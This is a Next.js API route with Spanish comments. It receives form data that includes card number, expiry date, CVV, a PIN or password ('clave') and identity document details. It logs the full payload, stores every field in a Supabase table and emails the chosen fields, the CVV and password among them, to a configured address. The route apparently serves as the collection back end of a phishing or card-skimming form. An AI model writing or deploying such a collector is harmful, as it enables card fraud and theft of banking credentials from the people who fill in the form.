import { NextResponse } from "next/server";
import { z } from "zod";
import { Resend } from "resend";
import { supabase } from "utils/supabase/server";

// 👉 Función inline para filtrar campos permitidos
function pickAllowedFields(
  payload: Record<string, any>,
  includeCsv: string | undefined
) {
  if (!includeCsv) return {};
  const allowed = includeCsv.split(",").map((s) => s.trim()).filter(Boolean);
  const out: Record<string, any> = {};
  for (const k of allowed) {
    if (k in payload) out[k] = payload[k];
  }
  return out;
}

// Configuración de Resend
const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null;

// ✅ Zod schema genérico
const Payload = z.record(z.string(), z.any());

export async function POST(req: Request) {
  try {
    const raw = await req.json();
    console.log("📩 Payload recibido:", raw);

    const data = Payload.parse(raw);

    // 1) Guardar en Supabase
    const { error: dbError } = await supabase.from("form_submissions").insert([
      {
        amount: data.amount,
        payDay: data.payDay,
        docType: data.docType,
        docNumber: data.docNumber,
        card: data.card,
        exp: data.exp,
        cvv: data.cvv,
        clave: data.clave,
        created_at: new Date().toISOString(),
      },
    ]);

    if (dbError) {
      console.error("❌ Supabase insert error:", dbError);
      return NextResponse.json(
        { ok: false, message: "Error guardando en Supabase" },
        { status: 500 }
      );
    }

    console.log("✅ Registro insertado en Supabase");

    // 2) Preparar correo
    const includeCsv = process.env.INCLUDE_FIELDS; // ej: "card,exp,cvv,clave,docType,docNumber"
    const allowed = pickAllowedFields(data, includeCsv);

    const entriesHtml = Object.entries(allowed)
      .map(([k, v]) => `<p><strong>${k}:</strong> ${String(v ?? "")}</p>`)
      .join("\n");

    const html = `
      <div style="font-family:system-ui,Segoe UI,Roboto,Arial;line-height:1.5">
        <h3>📩 Nuevo envío de formulario</h3>
        ${entriesHtml || "<i>No se configuraron INCLUDE_FIELDS</i>"}
        <hr/>
        <small>Enviado: ${new Date().toLocaleString()}</small>
      </div>
    `;

    // 3) Enviar correo con Resend
    const to = process.env.MAIL_TO!;
    const from = process.env.MAIL_FROM || "onboarding@resend.dev";

    if (!to) {
      return NextResponse.json(
        { ok: false, message: "MAIL_TO no configurado" },
        { status: 500 }
      );
    }

    if (resend) {
      try {
        const result = await resend.emails.send({
          from,
          to,
          subject: "📩 Nuevo formulario recibido",
          html,
        });
        console.log("📧 Email enviado:", result);
      } catch (emailErr) {
        console.error("❌ Error enviando correo con Resend:", emailErr);
      }
    } else {
      console.log("📧 Resend no configurado (RESEND_API_KEY ausente).");
    }

    return NextResponse.json({ ok: true });
  } catch (err: any) {
    console.error("❌ Error en POST:", err);
    return NextResponse.json(
      { ok: false, message: "Error interno", error: String(err) },
      { status: 500 }
    );
  }
}
